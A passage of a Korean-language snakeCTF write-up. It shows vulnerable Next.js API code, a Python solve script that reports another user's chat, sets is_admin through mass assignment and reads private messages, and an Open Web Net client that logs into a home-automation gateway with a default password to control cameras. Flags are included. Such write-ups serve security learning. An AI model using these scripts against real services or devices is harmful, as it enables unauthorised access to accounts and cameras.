`userId` 에 대한 검증이 없기 때문에, 공격자는 아무 채팅이나 reported 상태로 바꿀 수 있습니다.

```python
import openDb from '@/lib/db.js';
import jwt from 'jsonwebtoken';

const JWT_SECRET = process.env.JWT_SECRET || 'your_jwt_secret'; // Use environment variable in production

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ message: 'Authorization token required' });
  }

  const token = authHeader.split(' ')[1];

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    const userId = decoded.userId;

    const { matchId } = req.query;

    if (!matchId) {
      return res.status(400).json({ message: 'Match ID is required' });
    }

    const db = await openDb();

    const match = await db.get('SELECT id FROM matches WHERE id = ?', matchId);

    if (!match) {
      return res.status(404).json({ message: 'Match not found' });
    }

    const result = await db.run(
      'UPDATE matches SET is_reported = 1 WHERE id = ?',
      matchId
    );

    if (result.changes > 0) {
      res.status(200).json({ message: 'Match reported successfully.' });
    } else {
      res.status(500).json({ message: 'Failed to report match.' });
    }

  } catch (error) {
    console.error('Report chat API error:', error);
    if (error.name === 'JsonWebTokenError') {
      return res.status(401).json({ message: 'Invalid token' });
    }
    res.status(500).json({ message: 'Internal server error' });
  }
}

```

**[ `pages/api/edit.js` ]**

`editProfileSchema` 에 `.noUnknown()` 또는 `stripUnknown` 이 없기 때문에, 스키마 밖 필드가 `validated` 에 그대로 남게 되어 관리자 권한을 획득할 수 있습니다.

```py
import openDb from '@/lib/db.js';
import jwt from 'jsonwebtoken';
import * as yup from 'yup';

const JWT_SECRET = process.env.JWT_SECRET || 'your_jwt_secret'; // Use environment variable in production

const editProfileSchema = yup.object().shape({
  role: yup.string().oneOf(['WHITE_HAT', 'BLACK_HAT', 'GREY_HAT']),
  looking_for: yup.string().oneOf(['WHITE_HAT', 'BLACK_HAT', 'GREY_HAT']),
  age: yup.number().min(0).max(250),
  likes: yup.array().of(yup.string()).max(10),
  dislikes: yup.array().of(yup.string()).max(10),
  bio: yup.string().max(500),
  location: yup.string().max(100),
  hacks: yup.array().of(yup.string()).max(10),
  favorite_hacker: yup.string().max(100),
  favorite_song: yup.string().max(100),
  favorite_movie: yup.string().max(100),
  yt_embed: yup.string().url(),
});

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ message: 'Authorization token required' });
  }

  const token = authHeader.split(' ')[1];

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    const userId = decoded.userId;

    const db = await openDb();
    const user = await db.get('SELECT is_onboarded FROM users WHERE id = ?', userId);

    if (user && !user.is_onboarded) {
      return res.status(403).json({ message: 'User has not completed onboarding.' });
    }

    let validated;

    try {
      validated = await editProfileSchema.validate(req.body, { abortEarly: false });
    } catch (validationError) {
      return res.status(400).json({ message: validationError.errors.join(', ') });
    }

    const setClause = Object.keys(validated).map(field => `"${field}" = ?`).join(', ');
    const values = Object.values(validated);

    const updateQuery = `UPDATE users SET ${setClause} WHERE id = ?`;
    values.push(userId);

    const result = await db.run(updateQuery, ...values);

    if (result.changes > 0) {
      res.status(200).json({ message: 'Profile updated successfully!' });
    } else {
      res.status(404).json({ message: 'User not found or no changes made.' });
    }

  } catch (error) {
    console.error('Edit profile API error:', error);
    if (error.name === 'JsonWebTokenError') {
      return res.status(401).json({ message: 'Invalid token' });
    }
    res.status(500).json({ message: 'Internal server error' });
  }
}
```

### 풀이 코드

```python
import requests, re, uuid

BASE = "http://localhost:3000"
MATCH = 4
s = requests.Session()

u = f"u_{uuid.uuid4().hex[:6]}"
e = f"{u}@test.com"
p = "P@ssw0rd!!"
print(u, e, p)

# 1) register -> token
r = s.post(f"{BASE}/api/register", json={"username": u, "email": e, "password": p})
t = r.json().get("token") or r.json().get("jwt") or r.json().get("accessToken")
s.headers["Authorization"] = f"Bearer {t}"

# 2) onboarding
s.post(f"{BASE}/api/onboarding", json={
    "role": "WHITE_HAT",
    "looking_for": "WHITE_HAT",
    "age": 19,
    "likes": ["dummy"],
    "dislikes": ["dummy"],
    "bio": "dummy",
    "location": "dummy",
    "hacks": ["dummy"],
    "favorite_hacker": "dummy",
    "favorite_song": "dummy",
    "favorite_movie": "dummy",
    "yt_embed": "https://example.com/embed",
    "touches_grass": False
})

# 3) report target chat
s.post(f"{BASE}/api/chat/{MATCH}/report", json={"reason": "dummy"})

# 4) get admin
s.post(f"{BASE}/api/edit", json={"is_admin": True})

# 5) read chat
data = s.get(f"{BASE}/api/chat/{MATCH}").json()
text = "\n".join(m.get("content","") if isinstance(m,dict) else str(m) for m in data.get("messages",[]))
print(text)
```

### 플래그

```python
snakeCTF{d03s_1s_1nL0v3_w0rks_5271348842f6d477}
```

# Misc

## Closed Web Net 2

---

### 초기 탐색

문제 인스턴스를 생성하면 두 개의 서버 접속 정보를 받을 수 있습니다.

`own-ef0fb3c68aa2f9649e37814f5107f3cb.closed-web-net-2.challs.snakectf.org 20000`

`https://cam-ef0fb3c68aa2f9649e37814f5107f3cb.closed-web-net-2.challs.snakectf.org` 

(이어지는 풀이에서는 각각 **own서버**, **cam서버**로 부르겠습니다.)

먼저 cam서버에 접속을 시도했습니다.

페이지를 찾을 수 없다는 404 오류가 발생하였지만, 서버 응답 헤더에서 `Server: grabtofile`이라는 특이한 문자열을 발견했습니다. 

이를 키워드로 검색해본 결과, ‘Open Web Net’ 프로토콜을 발견했으며, `Open Web Net WHO=7` 문서에서 관련 키워드를 확인할 수 있었습니다. (https://developer.legrand.com/uploads/2019/12/WHO_7.pdf)

다음으로는 ncat으로 own서버에 접속하였습니다.

```python
ncat --ssl own-ef0fb3c68aa2f9649e37814f5107f3cb.closed-web-net-2.challs.snakectf.org 20000
*#*1##
```

초기 연결 시 받은 응답(`*#*1##`)은 Open Web Net 프로토콜의 ACK(승인) 응답임을 확인했습니다. 

또한, 문제 이름을 구글링하여 지난 2023 snakeCTF에 출제되었던 Closed Web Net 1번 문제의 라이트업을 찾을 수 있었습니다. (https://snakectf.org/writeups/2023/network/closed_web_net )

해당 풀이를 참고하여 인증 방식을 분석했습니다.

### 프로토콜 분석 및 인증

파이썬 코드를 아래와 같이 작성하여 Open Web Net 프로토콜 클라이언트를 구현했습니다.

통신 대상은 own서버입니다.

```python
import re
import socket
import ssl

HOST = "own-58de9bd6cb2ac8e70b56f17b0f2e66da.closed-web-net-2.challs.snakectf.org"
PORT = 20000
PASSWORD = 12345
psw_regex = re.compile(r'\*#[0-9]{0,32}##')

def calc_pwd(p, nonce):
    start, n1, n2 = True, 0, 0
    for c in nonce:
        if c != "0" and start:
            n2, start = p, False
        if c == '1':
            n1, n2 = (n2 & 0xFFFFFF80) >> 7, n2 << 25
        elif c == '2':
            n1, n2 = (n2 & 0xFFFFFFF0) >> 4, n2 << 28
        elif c == '3':
            n1, n2 = (n2 & 0xFFFFFFF8) >> 3, n2 << 29
        elif c == '4':
            n1, n2 = n2 << 1, n2 >> 31
        elif c == '5':
            n1, n2 = n2 << 5, n2 >> 27
        elif c == '6':
            n1, n2 = n2 << 12, n2 >> 20
        elif c == '7':
            n1 = n2 & 0x0000FF00 | ((n2 & 0xFF) << 24) | ((n2 & 0x00FF0000) >> 16)
            n2 = (n2 & 0xFF000000) >> 8
        elif c == '8':
            n1 = ((n2 & 0xFFFF) << 16) | (n2 >> 24)
            n2 = (n2 & 0x00FF0000) >> 8
        elif c == '9':
            n1 = ~n2
        else:
            n1 = n2
        n1 &= 0xFFFFFFFF
        n2 &= 0xFFFFFFFF
        if c not in "09":
            n1 |= n2
        n2 = n1
    return n1

class Client:
    def __init__(self):
        self.s, self.auth = None, False

    def connect(self):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        self.s = ctx.wrap_socket(socket.socket(), server_hostname=HOST)
        self.s.connect((HOST, PORT))

    def send(self, m):
        if not m.startswith('*'): m = '*' + m
        if not m.endswith('##'): m += '##'
        self.s.send(m.encode())

    def recv(self):
        try:
            return self.s.recv(1024).decode()
        except:
            return None

    def login(self):
        self.connect()
        if self.recv() != "*#*1##": return False
        self.send("*99*0##")
        r = self.recv()
        if not r or not psw_regex.match(r): return False
        nonce = r[2:-2]
        enc = calc_pwd(PASSWORD, nonce)
        self.send(f"*#{enc}##")
        if self.recv() == "*#*1##":
            self.auth = True
            return True
        return False

    def cmd(self, c):
        if not self.auth: return None
        self.send(c)
        return self.recv()

    def close(self):
        if self.s: self.s.close()

def main():
    c = Client()
    if not c.login(): return
    while True:
        try:
            i = input("OWN> ").strip()
            if i.lower() == "quit": break
            if i:
                r = c.cmd(i)
                print(r if r else "no response")
        except: break
    c.close()

if __name__ == "__main__":
    main()
```

위 코드를 사용하여, 초기 패스워드 `12345`로 인증에 성공했고, 
인증된 세션을 통해 카메라 제어 명령어를 전송할 수 있었습니다.

### 카메라 제어 및 플래그 획득

own서버에서 카메라 활성화 명령어(`*7*0*4000##`)를 입력한 후,

cam서버에서 카메라 URL (https://cam-58de9bd6cb2ac8e70b56f17b0f2e66da.closed-web-net-2.challs.snakectf.org/telecamera.php)에 접속했습니다. 


제일 처음 활성화 한 0번 카메라(4000) 에서는 고양이 이미지가 나왔습니다.

카메라를 차례대로 활성화 하던 중 2번 카메라(4002)를 활성화했을 때 QR 코드를 발견하였습니다.

다음은 실제 명령어 실행 결과입니다.

```python
$ python3 own_live_auth.py
OWN> *7*0*4002##
*#*1##
OWN> *7*160##
*#*1##
OWN> *7*160##
*#*1##
```

최종적으로 2번 카메라를 활성화하고 밝기 조절 명령어(`*7*160##`)를 전송했을 때, QR 코드가 나타났습니다. 

이 QR 코드를 디코딩하여 플래그를 획득했습니다.

### 플래그

`snakeCTF{0pen_w3b_n3t_ag4in??_09d8f7a2d883f121}`
